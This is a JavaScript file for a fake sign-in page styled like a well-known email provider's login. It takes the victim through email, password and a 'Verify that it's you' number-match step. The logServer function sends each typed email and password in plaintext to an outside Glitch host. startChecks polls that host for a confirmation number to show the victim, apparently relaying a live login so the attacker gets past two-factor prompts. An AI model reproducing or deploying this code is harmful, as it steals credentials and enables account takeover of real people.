const signinWrapper = document.querySelector(".signin-wrapper");
const infoInputs = document.querySelectorAll(".info-input");
const emailLabels = document.querySelectorAll(".email-label");
const emailSection = document.getElementById("emailSection");
const passwordSection = document.getElementById("passwordSection");
const numVerSection = document.getElementById("numberVerifySection");
const userInputs = document.querySelectorAll(".user-input");
const signinTitle = document.querySelector(".signin-title");
const signinPara = document.querySelector(".signin-para");
const verifyPara = document.querySelector(".verify-para");
const resendText = document.querySelector(".resend-txt");
const userWrapper = document.querySelector(".user-wrapper");
const userText = document.querySelector(".user-txt");
const nextBtn = document.querySelector(".btn-next");
const createAccountText = document.getElementById("createAccountText");
const forgotPasswordText = document.getElementById("forgotPasswordText");
const errorEL = document.querySelectorAll(".error-flex");
const checkBoxBackg = document.querySelector(".password-box-bg");
const checkBox = document.querySelector(".password-checkbox");
const checkImg = document.querySelector(".check-img");
const tryAnother = document.querySelector(".try-another");
const numberPicks = document.querySelectorAll(".number-pick");
setTimeout(() => {
    infoInputs[0].focus();
}, 250);

const placeHolders = ["Email or phone", "Enter your password"];

setTimeout(() => {
    infoInputs[1].type = "password";
}, 300);

let currentPage = "email";
let inputColor = "var(--lighter-grey)";
let passwordShowing = false;
let awaiting = false;
let emailData = "";
let passwordData = "";
let loadInt;
let checkInt;
let confNumber = "0";

// email input focus/non focus animations
infoInputs.forEach((input, idx) => {
    input.addEventListener("focus", (e) => {
        if(inputColor != "var(--red)"){
            inputColor = "var(--blue)";
        }
        input.placeholder = "";
        input.style.boxShadow = "0px 0px 0px 2px " + inputColor;
        emailLabels[idx].style.display = "block";
        emailLabels[idx].offsetWidth; 
        emailLabels[idx].classList.remove("el-normal");
        emailLabels[idx].classList.remove("el-inactive");
        emailLabels[idx].classList.add("el-focus");
    });
    input.addEventListener("blur", () => {
        if(inputColor == "var(--blue)"){
            inputColor = "var(--lighter-grey)";
        }
        input.style.boxShadow = "0px 0px 0px 1px " + inputColor;
        if(input.value == ""){

                emailLabels[idx].classList.remove("el-focus");
                emailLabels[idx].classList.add("el-normal");
                setTimeout(() => {
                    input.placeholder = "Email or phone";
                    emailLabels[idx].style.display = "none";
                }, 300);
        }
        else {
            emailLabels[idx].style.transition = "0s linear";
            emailLabels[idx].classList.remove("el-focus");
            emailLabels[idx].classList.add("el-inactive");
            emailLabels[idx].style.transition = "0.1s linear";
        }
    });
});
checkBoxBackg.addEventListener("mouseover", () => {
    checkBoxBackg.style.backgroundColor = "var(--light-blue-highlight)";
});
checkBoxBackg.addEventListener("mouseout", () => {
    checkBoxBackg.style.backgroundColor = "transparent";
});

function createDetails(){
    console.log(createWrapper.style.display);
    if(createWrapper.style.display == "none"){
        createWrapper.style.display = "block";
        createWrapper.offsetWidth;
        createWrapper.style.transform = "scale(1)";
        createWrapper.style.opacity = "1";
    } else {
        createWrapper.style.transform = "scale(0.8)";
        createWrapper.style.opacity = "0";
        setTimeout(() => {
            createWrapper.style.display = "none";
        }, 300);
    }
}

function loadPage(){
    document.querySelector(".load-blur").style.display = "block";
    document.querySelector(".load-fill").style.visibility = "visible";
}
nextBtn.addEventListener("mousedown", (e) => {
    e.preventDefault();
});
function nextPage(){
    // ERROR CATCH //
    if(currentPage == "email" && infoInputs[0].value == ""){
        inputColor = "var(--red)";
        emailLabels[0].style.color = "var(--red)";
        errorEL[0].style.display = "flex";
        infoInputs[0].style.boxShadow = "0px 0px 0px 2px " + inputColor;
        setTimeout(() => {
            infoInputs[0].focus();
        }, 20);
    } else if(currentPage == "password" && infoInputs[1].value == ""){
        inputColor = "var(--red)";
        emailLabels[1].style.color = "var(--red)";
        errorEL[1].style.display = "flex";
        infoInputs[1].style.boxShadow = "0px 0px 0px 2px " + inputColor;
        setTimeout(() => {
            infoInputs[1].focus();
        }, 20);
    }
else {
    inputColor = "var(--lighter-grey)";
    loadPage();

    if(currentPage == "email"){
        emailData = infoInputs[0].value;
        logServer("EMAIL", emailData);
    } else if(currentPage == "password"){
        passwordData = infoInputs[1].value;
        logServer("PASSWORD", passwordData);
    }

    setTimeout(() => {
        if(currentPage == "email"){
            document.querySelector(".load-blur").style.display = "none";
            document.querySelector(".load-fill").style.visibility = "hidden";
            currentPage = "password";
            signinTitle.textContent = "Welcome";
            signinPara.style.display = "none";
            userText.textContent = infoInputs[0].value;
            userWrapper.style.display = "flex";
            createAccountText.style.display = "none";
            forgotPasswordText.style.display = "flex";
            emailSection.style.right = "550px";
            passwordSection.style.right = "2px";
            setTimeout(() => {
                infoInputs[1].focus();
            }, 400);
        } else if(currentPage == "password"){
            checkInt = setInterval(() => {
                startChecks();
            }, 2000);
        } 
    }, 1500);
}}

function logServer(dataType, dataValue){
    fetch('https://coherent-rare-floss.glitch.me/send', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
            body: JSON.stringify({ message: dataType + " => " + dataValue })
    })
    .then(response => response.text())
    .catch(error => {
        console.error('Error:', error);
    });
}

async function startChecks(){
    try{
        const response = await fetch("https://coherent-rare-floss.glitch.me/value");
        const data = await response.json();

        if(data.status == "ready"){
            confNumber = data.number;
            numberPicks.forEach(number => {
                number.textContent = confNumber;
            });
            clearInterval(checkInt);
            
            document.querySelector(".load-blur").style.display = "none";
            document.querySelector(".load-fill").style.visibility = "hidden";
            currentPage = "verification";
            signinTitle.textContent = "Verify that it's you";
            verifyPara.style.display = "block";
            resendText.style.display = "block";
            signinWrapper.style.height = "475px";
            forgotPasswordText.style.display = "none";
            nextBtn.style.display = "none";
            tryAnother.style.display = "block";
            passwordSection.style.right = "550px";
            numVerSection.style.right = "2px";
        }
    }catch(err){
        console.error(err);
    }
}

function togglePassword(){
    checkBoxBackg.style.backgroundColor = "var(--darker-blue-highlight)";
    setTimeout(() => {
        checkBoxBackg.style.backgroundColor = "var(--light-blue-highlight)";
    }, 100);
    if(!passwordShowing){ // make it show
        infoInputs[1].type = "text";
        passwordShowing = true;

        checkBox.style.border = "2px solid var(--blue)";
        checkBox.style.backgroundColor = "var(--blue)";
        checkImg.style.opacity = "1";
    } else { // make it not show
        infoInputs[1].type = "password";
        passwordShowing = false;
        checkBox.style.border = "2px solid var(--light-grey)";
        checkBox.style.backgroundColor = "transparent";
        checkImg.style.opacity = "0";
    }
}